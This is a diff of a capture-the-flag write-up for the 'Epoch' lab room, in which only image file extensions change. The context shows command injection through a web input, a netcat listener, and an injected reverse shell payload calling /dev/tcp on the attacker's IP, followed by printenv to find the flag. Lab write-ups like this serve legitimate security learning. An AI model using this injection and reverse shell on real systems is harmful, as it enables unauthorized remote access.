@@ -7,7 +7,7 @@ tags:
 
 #### Author: AMD
 
-![[static/epoch/epoch.png]]
+![[static/epoch/epoch.webp]]
 
 This is a writeup for <b>Epoch</b> room.
 
@@ -18,7 +18,7 @@ My target IP: 10.10.218.15
 
 If we read the room explanation "Our website actually just passes your input right along to that command-line program!" we can see that we might be able to run commands. So lets try it.
 
-![[static/epoch/ls.png]]
+![[static/epoch/ls.webp]]
 
 Perfect, we can run commands. Lets find a way to get in.
 
@@ -27,13 +27,13 @@ Perfect, we can run commands. Lets find a way to get in.
 
 Visit https://www.revshells.com/ and use your pc's IP to handle the condiguration.
 
-![[static/epoch/shell_conf.png]]
+![[static/epoch/shell_conf.webp]]
 
 run "nc -lvnp 9001"
 
 input "&sh -i >& /dev/tcp/10.10.244.218/9001 0>&1"
 
-![[static/epoch/conn_received.png]]
+![[static/epoch/conn_received.webp]]
 
 -----------------------------------------------------------------------------------
 <b>GET THE FLAG</b>
@@ -42,6 +42,6 @@ When we look around we can not find the flag. Lets look at the hint: "The develo
 
 Lets try "printenv" to see the environment variables.
 
-![[static/epoch/printenv.png]]
+![[static/epoch/printenv.webp]]
 
 -----------------------------------------------------------------------------------
